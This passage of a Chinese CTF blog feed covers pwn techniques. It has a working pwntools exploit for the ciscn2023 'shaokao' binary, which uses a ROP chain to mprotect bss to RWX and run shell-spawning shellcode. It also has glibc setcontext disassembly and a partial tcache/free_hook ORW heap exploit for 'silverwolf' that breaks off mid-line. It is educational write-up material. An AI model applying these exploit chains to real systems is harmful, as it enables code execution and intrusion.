apple2"></a>house of apple2</h1><h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h1><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> how2heap </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn技巧-mprotect</title>
      <link href="/posts/25804/"/>
      <url>/posts/25804/</url>
      
        <content type="html"><![CDATA[<p><strong>mprotect函数的功能是用来设置一块内存的权限</strong></p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><code>mprotect</code> 是一个系统调用，用于更改指定内存区域的保护属性，包括读、写、执行权限。它通常在操作系统中用于管理内存的访问权限，以增强程序的安全性和灵活性。在C语言中，<code>mprotect</code> 的原型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><ul><li><p><code>addr</code>：指向目标内存区域起始地址的指针。</p></li><li><p><code>len</code>：内存区域的长度（以字节为单位）。</p></li><li><p><code>prot</code>：要设置的保护属性，使用以下标志的按位或组合：</p><ul><li><code>PROT_NONE</code>：禁止对内存区域的任何访问。0</li><li><code>PROT_READ</code>：允许读取内存区域的内容。4</li><li><code>PROT_WRITE</code>：允许写入内存区域的内容。2</li><li><code>PROT_EXEC</code>：允许在内存区域中执行代码。1</li></ul></li></ul><p><code>mprotect</code> 的作用在于修改指定内存区域的访问权限，从而允许或禁止不同类型的访问。这对于实现一些特定的内存保护机制非常有用，例如：</p><ol><li><strong>代码段保护</strong>：在程序运行时，将代码段设置为只执行（<code>PROT_EXEC</code>），以防止恶意代码注入并执行。</li><li><strong>数据段保护</strong>：可以将某些敏感数据区域设置为只读（<code>PROT_READ</code>），防止在不合适的情况下被修改。</li><li><strong>动态内存分配保护</strong>：在使用动态内存分配函数（如<code>malloc</code>）分配内存后，可以使用<code>mprotect</code> 来限制对该内存区域的访问权限，从而确保只有特定的操作可以修改或执行该内存。</li></ol><h1 id="在pwn中的利用"><a href="#在pwn中的利用" class="headerlink" title="在pwn中的利用"></a>在pwn中的利用</h1><p>一般都是利用其修改某一块内存权限为rwx,然后去执行shellcode</p><h2 id="例ciscn2023-烧烤摊儿"><a href="#例ciscn2023-烧烤摊儿" class="headerlink" title="例ciscn2023 烧烤摊儿"></a>例ciscn2023 烧烤摊儿</h2><p>常规做法原本是ret2syscall构造rop链</p><p>但这道题没有pie且有使用mprotect函数</p><p>所以可以修改bss段上的空白内存的权限,再往里面写入shellcode,之后返回该处执行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#binary = &#x27;./shaokao&#x27;</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./shaokao&#x27;)</span></span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line">su = <span class="keyword">lambda</span> buf,addr:io.success(buf+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28568)</span></span><br><span class="line">io = process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1000000</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">read=<span class="number">0x457DC0</span><span class="comment">#elf.symbols[&#x27;read&#x27;]</span></span><br><span class="line">mprotect=<span class="number">0x458B00</span><span class="comment">#elf.symbols[&#x27;mprotect&#x27;]</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">ru(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">ru(<span class="string">&quot;请赐名：&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x4E8000</span>)<span class="comment">#第一个参数addr，0x4E8000是bss段上的一块空白区域</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0x1000</span>)<span class="comment">#第二个参数len</span></span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)<span class="comment">#第三个参数prot以及函数调用</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)<span class="comment">#read的第一个参数，0代表从用户输入的值中读取</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0x4E8000</span>)<span class="comment">#read的第二个参数，代表数据输入到的地址</span></span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)<span class="comment">#read的第三个参数输入大小和read函数调用</span></span><br><span class="line">payload+=p64(<span class="number">0x4E8000</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0x4E8000</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x4E8000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)+p64(<span class="number">0x4E8000</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sl(shellcode)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> mprotect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SunmerWeek5</title>
      <link href="/posts/16788/"/>
      <url>/posts/16788/</url>
      
        <content type="html"><![CDATA[<h1 id="任务Ⅰ"><a href="#任务Ⅰ" class="headerlink" title="任务Ⅰ"></a>任务Ⅰ</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>setcontext是libc中的一个函数</p><p><strong>2.27版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p><strong>2.29版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000055E00                               public setcontext ; weak</span><br><span class="line">.text:0000000000055E00                               setcontext proc near                    ; CODE XREF: sub_5C160+C↓p</span><br><span class="line">.text:0000000000055E00                                                                       ; DATA XREF: LOAD:000000000000C6D8↑o</span><br><span class="line">.text:0000000000055E00                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E00 57                            push    rdi</span><br><span class="line">.text:0000000000055E01 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000055E08 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:0000000000055E0A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:0000000000055E0F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000055E15 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:0000000000055E1A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000055E1C 5A                            pop     rdx</span><br><span class="line">.text:0000000000055E1D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000055E23 73 5B                         jnb     short loc_55E80</span><br><span class="line">.text:0000000000055E23</span><br><span class="line">.text:0000000000055E25 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000055E2C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000055E2E 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000055E35 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000055E3C 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000055E43 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000055E47 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000055E4B 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000055E4F 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000055E53 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000055E57 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000055E5E 51                            push    rcx</span><br><span class="line">.text:0000000000055E5F 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055E63 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055E67 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000055E6E 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000055E72 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055E76 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055E76                               ; &#125; // starts at 55E00</span><br><span class="line">.text:0000000000055E7D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E7D 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000055E7F C3                            retn</span><br></pre></td></tr></table></figure><hr><p>不难看出利用的核心是rdi(2.29以前)和rdx(2.29及以后)</p><p>要从特定位置:<code>mov rsp , [??]</code>开始执行</p><p>需要从特定位置开始是因为上面的代码会使程序crash</p><p>程序控制了除rax以外的几乎所有寄存器,</p><p>其中rip是通过以下代码控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, [rdi/rdx+0A8h]</span><br><span class="line">push    rcx</span><br><span class="line">....</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>唯一不可控的rax也在 <code>xor   eax, eax</code>的作用下变为<strong>零</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h3><p>2.29以下的利用要更为简单一些</p><p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题。我们通常是吧 setcontext + 53 写进 <strong>free_hook 或者 </strong>malloc_hook 中，然后建立或者释放一个堆块，特别释放时 rdi 就会是该堆块的 chunk 头，那如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序的执行流。</p><h3 id="2-29及以上"><a href="#2-29及以上" class="headerlink" title="2.29及以上"></a>2.29及以上</h3><p>2.29 最大的变动就是 setcontext 里控制寄存器由 rdi 变成了 rdx，这就使得我们无法通过直接控制 free 的堆块来控制寄存器。所以要用到一些 gadget 来把 rdi 和 rdx 转换一下。</p><hr><p>主要通过直接运行一个函数,然后配合栈调整到可控区域进而执行rop流</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><p>checksec,保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>ida可以看到有开启沙盒,只允许orw</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>功能是老四样,不过同时只能申请一个chunk</p><p>其中delete存在uaf,edit存在off-by-null</p><p><strong>利用思路:</strong></p><ol><li>先清空seccomp带来的chunk</li><li>泄露heap_base</li><li>利用uaf写next为tcache_pthread,将其申请出来</li><li>七次free,每次都要破坏它的key</li><li>满后放入unsortedbin,泄露libc</li><li>准备好各个gadget,因为控制的是返回流所以使用gadeget</li><li>修改tcahe_pethread,使得申请chunk得到目标地址</li><li>写free_hook,同时在堆中布置参数环境</li><li>free触发orw</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./silverwolf&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./silverwolf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cho=<span class="string">b&#x27;Your choice: &#x27;</span>      <span class="comment"># choice提示语</span></span><br><span class="line">siz=<span class="string">b&#x27;Size: &#x27;</span>     <span class="comment"># size输入提示语</span></span><br><span class="line">con=<span class="string">b&#x27;Content: &#x27;</span>         <span class="comment"># content输入提示语</span></span><br><span class="line">ind=<span class="string">b&#x27;Index: &#x27;</span>      <span class="comment"># index输入提示语</span></span><br><span class="line">edi=<span class="string">b&#x27;&#x27;</span>          <span class="comment"># edit输入提示语</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(siz,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendafter(con,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line"> </span><br><span class="line">    add(<span class="number">0x58</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">raw = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;raw :&quot;</span>+<span class="built_in">hex</span>(raw))</span><br><span class="line">heap = raw-<span class="number">0x11b0</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment">#申请free78申请到了tacahce pthread，并没有做检查</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free()  <span class="comment">#此时free就是放入0x250的链中</span></span><br><span class="line">        edit(p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">free()<span class="comment"># tcache满了，将tacahce pthread放入unsourted bin</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;setcontext:&quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line">pop_rdi = libc.address+<span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi = libc.address+<span class="number">0x0000000000023eea</span></span><br><span class="line">syscall = <span class="number">0xD2745</span>+libc.address</span><br><span class="line">pop_rdx_r10 = <span 